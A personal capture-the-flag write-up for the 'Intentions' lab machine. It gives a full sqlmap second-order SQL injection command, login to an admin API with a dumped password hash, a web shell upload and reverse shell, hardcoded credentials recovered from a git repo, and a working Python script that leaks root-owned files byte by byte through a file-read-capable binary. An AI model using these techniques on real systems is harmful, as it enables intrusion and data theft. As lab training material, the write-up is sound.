---
created: 2026-03-17
---

📅 `2026-03-17`

#sql-injection #api #rce #binary #git

----

## 🖥️ Box Info

| ️🏷️ Name         |   `Intentions`  |
| --------------- | --- |
| 📆 Release Date |  `2023-07-01`   |
| 🌐 IP Address   |   `10.129.229.27`  |
| 🖥️ OS           |  `Linux`   |
| 🎯 Difficulty   |  `Hard`   |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- `SQL` injection, manually guiding `sqlmap`
- `API` testing across versions (`v1` and `v2`)
- `ImageMagick` `RCE`
- `Git` repo inspection
- Binary with arbitrary read permissions
- Extremely hard machine, insane-level foothold

**🛠️ Tools:**  

- `sqlmap`
- `Caido`
- `git-dumper`

**📚 Learned:**  

- `sqlmap` can do second-order `SQL` injection.
- Always test `SQL` injection manually first, and then we can nudge `sqlmap` with parameters like `--prefix=<prefix>` and `--suffix=<suffix>`. This can make the difference between a successful `SQL` injection and a failure.
- Testing `API` versions.
- `ImageMagick`'s `PHP` library `Imagick` has a vulnerability involving a partial write the library makes when using the `msl` scheme, which can be used to write a web shell.
- Read a file byte by byte using a hash-checking binary with elevated file read capabilities.
- If we don't have permissions to enumerate a `git` repo, we can just download it locally by starting a web server on the target machine and downloading with `git-dumper`.

----

## 🌐 Port Scan

- **TCP**: 22, 80
- **UDP**: None

---

## 🔍 Enumeration

The website looked like a gallery viewing site.

![[Pasted image 20260317163944.png]]

I found a second-order `SQL` injection. A payload saved in our user's genres is stored safely, but it's used unsanitized in a database query when we load the feed.

![[Pasted image 20260317164008.png]]

Also, the `genres` field is the only user-modifiable input I found on the website, so it had to be that way.

---

## 🪜 Foothold

Testing manually, I found space was a bad character, so I had to use tabs instead. I wrote a simple `sqlmap` tamper script, `space2tab`. I tested by checking for errors: if the request to `/feed` returned no error, the injected query was valid. By doing this thoroughly I found that it was doing something like: `...IN ('a', 'b', 'c')...`, so I had to close the string and the parentheses. I also found that the comment character allowed was `#`. We can tell `sqlmap` to do all this with its advanced flags.

```shell
sqlmap -r req.txt --second-req=req2.txt --dbms=mysql --batch --no-cast --technique=U --prefix="')" --suffix='#' --tamper=space2tab --flush-session
```

Here I have a `req.txt` file, which is the request that sets the `genre` field of our user to the `SQLi` payload, and `req2.txt` is the request that checks `/feed`. `sqlmap` uses the second request to check the result of the injection.

After successful injection, I managed to dump all databases. Found user `greg` and password hash `$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m`. This was not crackable, but I found if we log in via the `v2` `API`, it asks for our `hash` instead of the password, so I got in as `greg`, an admin user with access to `/admin`.

![[Pasted image 20260317164737.png]]

![[Pasted image 20260317164639.png]]

Modifying an image sends a `POST` request to `/api/v2/admin/image/modify`.

I was able to upload a web shell by sending a `POST` request to `/api/v2/admin/image/modify` with this data:

![[Pasted image 20260317163538.png]]

And then, with `webshell-handler`, I used a `bash` reverse shell payload, upgraded it, and got a stable shell as `www-data`.

---

## 👤 User

In the web app's root directory (`/var/www/html/intentions`) there was a `git` repo, but `www-data` could not read it, so I started a web server on the target and downloaded it to my machine.

```shell
git-dumper http://10.129.229.27:8000
```

```shell
$ git log
commit 1f29dfde45c21be67bb2452b46d091888ed049c3 (HEAD -> master)
Author: steve <steve@intentions.htb>
Date:   Mon Jan 30 15:29:12 2023 +0100

    Fix webpack for production

commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

commit 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
Author: greg <greg@intentions.htb>
Date:   Wed Jan 25 20:45:12 2023 +0100

    Adding test cases for the API!

commit d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd
Author: steve <steve@intentions.htb>
Date:   Fri Jan 20 14:19:32 2023 +0100

    Initial v2 commit
```

The second commit looked interesting.

```shell
$ git log 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
<SNIP>
+class Helper extends TestCase
+{
+    public static function getToken($test, $admin = false) {
+        if($admin) {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        }
+        else {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        }
+    }
+}
<SNIP>
```

Now we can log in via `SSH` as `greg`.

```shell
$ ssh greg@10.129.229.27
greg@10.129.229.27's password:

$ ls
dmca_check.sh  dmca_hashes.test  user.txt
$ cat user.txt
<REDACTED>
```


---

## 🛡️ Privilege Escalation

User `greg` was in the `scanner` group. Searching with `find`, I found a binary owned by that group: `/opt/scanner/scanner`. I used `getcap` and found this:

```shell
greg@intentions:~$ getcap /opt/scanner/scanner
/opt/scanner/scanner cap_dac_read_search=ep
```

This capability allows the binary to read any file. Reading the help menu, something interesting showed up.

```
greg@intentions:/opt/scanner$ ./scanner
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

        The hash blacklist file should be maintained as a single LABEL:MD5 per line.
        Please avoid using extra colons in the label as that is not currently supported.

        Expected output:
        1. Empty if no matches found
        2. A line for every match, example:
                [+] {LABEL} matches {FILE}

  -c string
        Path to image file to check. Cannot be combined with -d
  -d string
        Path to image directory to check. Cannot be combined with -c
  -h string
        Path to colon separated hash file. Not compatible with -p
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p    [Debug] Print calculated file hash. Only compatible with -c
  -s string
        Specific hash to check against. Not compatible with -h
```

The `-l` option limits how many bytes of the file (passed with `-c`) get hashed. By hashing the first byte, then the first two, and so on, and comparing each result against hashes of our guesses, we can recover any file one byte at a time. I used this vulnerability to read the `root` user's flag.

>[!tip]
>The `-s <hash>` option was required, or else it just returned the help message.

```python
import subprocess
import hashlib
import string

def get_hash(filepath, length):
    result = subprocess.run(
        ['/opt/scanner/scanner', '-c', filepath, '-s', 'd725b63d93b29502ec26c4c52ec576ff', '-p', '-l', str(length)],
        capture_output=True, text=True
    )
    return result.stdout.split('hash ')[1].strip()

target = '/root/root.txt'
known = b''

# Likely chars for a flag/key
charset = (string.ascii_letters + string.digits + string.punctuation + '\n').encode()

for i in range(1, 200):
    current_hash = get_hash(target, i)
    found = False
    for byte in range(256):
        candidate = known + bytes([byte])
        if hashlib.md5(candidate).hexdigest() == current_hash:
            known = candidate
            print(f"[+] {known.decode(errors='replace')}", end='\r', flush=True)
            found = True
            break
    if not found:
        print(f"\n[-] Failed at byte {i}")
        break
    if known.endswith(b'\n') and i > 10:
        break

print(f"\n[+] Result: {known.decode(errors='replace')}")
```

>[!tip]
>I could have read `root`'s `SSH` key and logged in as `root`, but reading the flag directly was enough.

And got the root flag.

```
greg@intentions:/tmp$ python3 read.py
[+] <REDACTED>

[+] Result: <REDACTED>
```


Rooted.